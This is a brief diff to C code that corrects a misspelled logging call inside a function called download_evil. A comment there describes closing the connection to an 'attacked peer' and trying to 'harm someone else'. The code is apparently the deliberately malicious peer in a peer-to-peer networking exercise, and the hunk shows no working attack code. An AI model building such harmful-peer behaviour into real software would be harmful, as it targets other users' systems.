@@ -618,7 +618,7 @@ static void download_evil(task_t* t, task_t *tracker_task)
 
 try_again:
 	//Close connection to attacked peer and try to harm someone else
-	messsage("* Closing connection to attacked peer\n");
+	message("* Closing connection to attacked peer\n");
 	for(i = 0; i < 1000; i++)
 	{
 		if(ids[i] >= 0)
